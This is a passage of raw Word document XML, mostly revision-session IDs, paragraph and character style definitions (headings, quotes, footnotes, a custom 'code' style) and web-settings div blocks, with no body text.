    <w:rsid w:val="00CD72C8"/>
    <w:rsid w:val="00CD7D4F"/>
    <w:rsid w:val="00CE09C5"/>
    <w:rsid w:val="00CE13B3"/>
    <w:rsid w:val="00CF01E4"/>
    <w:rsid w:val="00CF0B9E"/>
    <w:rsid w:val="00CF75AD"/>
    <w:rsid w:val="00D01D16"/>
    <w:rsid w:val="00D0374C"/>
    <w:rsid w:val="00D11AE8"/>
    <w:rsid w:val="00D23CA3"/>
    <w:rsid w:val="00D40998"/>
    <w:rsid w:val="00D40F41"/>
    <w:rsid w:val="00D41672"/>
    <w:rsid w:val="00D478E8"/>
    <w:rsid w:val="00D51047"/>
    <w:rsid w:val="00D60DCB"/>
    <w:rsid w:val="00D60EA5"/>
    <w:rsid w:val="00D630DA"/>
    <w:rsid w:val="00D71CF0"/>
    <w:rsid w:val="00D76FA8"/>
    <w:rsid w:val="00D828F5"/>
    <w:rsid w:val="00D87FE7"/>
    <w:rsid w:val="00D9718A"/>
    <w:rsid w:val="00DB0770"/>
    <w:rsid w:val="00DB3380"/>
    <w:rsid w:val="00DC186F"/>
    <w:rsid w:val="00DC50DF"/>
    <w:rsid w:val="00DC56CC"/>
    <w:rsid w:val="00DD1017"/>
    <w:rsid w:val="00DD22DB"/>
    <w:rsid w:val="00DE767C"/>
    <w:rsid w:val="00DF0790"/>
    <w:rsid w:val="00DF555A"/>
    <w:rsid w:val="00DF6615"/>
    <w:rsid w:val="00E07AE9"/>
    <w:rsid w:val="00E17874"/>
    <w:rsid w:val="00E229ED"/>
    <w:rsid w:val="00E45F3F"/>
    <w:rsid w:val="00E56045"/>
    <w:rsid w:val="00E72F21"/>
    <w:rsid w:val="00E747D3"/>
    <w:rsid w:val="00E74F68"/>
    <w:rsid w:val="00E76CF8"/>
    <w:rsid w:val="00E87167"/>
    <w:rsid w:val="00E935C0"/>
    <w:rsid w:val="00EA104E"/>
    <w:rsid w:val="00EB1800"/>
    <w:rsid w:val="00EC27F5"/>
    <w:rsid w:val="00EE727F"/>
    <w:rsid w:val="00EF5198"/>
    <w:rsid w:val="00F00345"/>
    <w:rsid w:val="00F004B6"/>
    <w:rsid w:val="00F12A52"/>
    <w:rsid w:val="00F153E1"/>
    <w:rsid w:val="00F21893"/>
    <w:rsid w:val="00F23E6A"/>
    <w:rsid w:val="00F34A79"/>
    <w:rsid w:val="00F34B27"/>
    <w:rsid w:val="00F34FCF"/>
    <w:rsid w:val="00F4333E"/>
    <w:rsid w:val="00F51BD8"/>
    <w:rsid w:val="00F54373"/>
    <w:rsid w:val="00F60CE5"/>
    <w:rsid w:val="00F628AC"/>
    <w:rsid w:val="00F63B8B"/>
    <w:rsid w:val="00F662A3"/>
    <w:rsid w:val="00F8417D"/>
    <w:rsid w:val="00F9099B"/>
    <w:rsid w:val="00F94AB9"/>
    <w:rsid w:val="00F97BCD"/>
    <w:rsid w:val="00FA045B"/>
    <w:rsid w:val="00FD533F"/>
    <w:rsid w:val="00FE3B22"/>
    <w:rsid w:val="00FF22EA"/>
    <w:rsid w:val="00FF51EB"/>
    <w:rsid w:val="00FF69A5"/>
    <w:rsid w:val="00FF7616"/>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2E8BBD"/>
  <w15:docId w15:val="{B9F213E0-6F02-48A7-B129-EDC9BFA7D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7B3D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="004D7B3D"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:pageBreakBefore/>
      <w:numPr>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:spacing w:before="360"/>
      <w:ind w:left="6953"/>
      <w:jc w:val="right"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="12"/>
      </w:numPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="12" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:spacing w:before="360" w:after="200"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00822837"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="12"/>
      </w:numPr>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404615"/>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404615"/>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rsid w:val="00404615"/>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rsid w:val="00404615"/>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04615"/>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04615"/>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63BE"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:contextualSpacing/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="56"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TitleChar">
    <w:name w:val="Title Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Title"/>
    <w:uiPriority w:val="10"/>
    <w:rsid w:val="003363BE"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="56"/>
      <w:szCs w:val="56"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Subtitle">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="SubtitleChar"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:rsid w:val="0040461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04615"/>
    <w:rPr>
      <w:color w:val="5A5A5A" w:themeColor="text1" w:themeTint="A5"/>
      <w:spacing w:val="10"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="004D7B3D"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Calibri" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="48"/>
      <w:szCs w:val="36"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="009525A9"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Calibri" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="00822837"/>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404615"/>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404615"/>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sid w:val="00404615"/>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sid w:val="0040461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0461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04615"/>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sid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseEmphasis">
    <w:name w:val="Intense Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="21"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:caps/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Quote">
    <w:name w:val="Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="QuoteChar"/>
    <w:uiPriority w:val="29"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:spacing w:before="160"/>
      <w:ind w:left="720" w:right="720"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QuoteChar">
    <w:name w:val="Quote Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Quote"/>
    <w:uiPriority w:val="29"/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:qFormat/>
    <w:rsid w:val="0040461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04615"/>
    <w:rPr>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2" w:themeFill="background1" w:themeFillShade="F2"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleReference">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="31"/>
    <w:qFormat/>
    <w:rsid w:val="0040461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04615"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="BookTitle">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="33"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:rPr>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Caption">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="35"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>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rsid w:val="00404615"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NoSpacing">
    <w:name w:val="No Spacing"/>
    <w:link w:val="NoSpacingChar"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00404615"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="003C7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27573"/>
    <w:rPr>
      <w:color w:val="6B9F25" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="PlainTable11">
    <w:name w:val="Plain Table 11"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="41"/>
    <w:rsid w:val="006B38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SpacingChar">
    <w:name w:val="No Spacing Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="NoSpacing"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="00046389"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="code">
    <w:name w:val="code"/>
    <w:basedOn w:val="NoSpacing"/>
    <w:link w:val="codeChar"/>
    <w:qFormat/>
    <w:rsid w:val="00DD22DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="codeChar">
    <w:name w:val="code Char"/>
    <w:basedOn w:val="NoSpacingChar"/>
    <w:link w:val="code"/>
    <w:rsid w:val="00DD22DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00247263"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="left" w:pos="880"/>
        <w:tab w:val="left" w:pos="1560"/>
        <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
      </w:tabs>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00712DC9"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="440"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004E73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733D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004E73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733D"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00BE6B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6B72"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Abtracttitle">
    <w:name w:val="Abtracttitle"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="AbtracttitleChar"/>
    <w:qFormat/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="left" w:pos="2390"/>
      </w:tabs>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:sz w:val="40"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="AbtracttitleChar">
    <w:name w:val="Abtracttitle Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Abtracttitle"/>
    <w:rsid w:val="009525A9"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:sz w:val="40"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="TableGrid0">
    <w:name w:val="TableGrid"/>
    <w:rsid w:val="009525A9"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:eastAsia="en-US"/>
    </w:rPr>
    <w:tblPr>
      <w:tblCellMar>
        <w:top w:w="0" w:type="dxa"/>
        <w:left w:w="0" w:type="dxa"/>
        <w:bottom w:w="0" w:type="dxa"/>
        <w:right w:w="0" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Revision">
    <w:name w:val="Revision"/>
    <w:hidden/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00BA7AE1"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="FootnoteText">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FootnoteTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00CA5897"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FootnoteTextChar">
    <w:name w:val="Footnote Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="FootnoteText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00CA5897"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FootnoteReference">
    <w:name w:val="footnote reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00CA5897"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00154C09"/>
    <w:rPr>
      <w:color w:val="B26B02" w:themeColor="followedHyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CommentReference">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00C3473A"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentText">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CommentTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00C3473A"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentTextChar">
    <w:name w:val="Comment Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="CommentText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00C3473A"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="CommentSubject">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="CommentText"/>
    <w:next w:val="CommentText"/>
    <w:link w:val="CommentSubjectChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00C3473A"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CommentSubjectChar">
    <w:name w:val="Comment Subject Char"/>
    <w:basedOn w:val="CommentTextChar"/>
    <w:link w:val="CommentSubject"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00C3473A"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006D5BB6"/>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HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00085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085E66"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLCode">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00085E66"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Bibliography">
    <w:name w:val="Bibliography"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="37"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00941E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0193">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="74866318">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="80567054">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="123617809">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="135681435">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="136731169">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="190611308">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="204758954">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="230123774">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
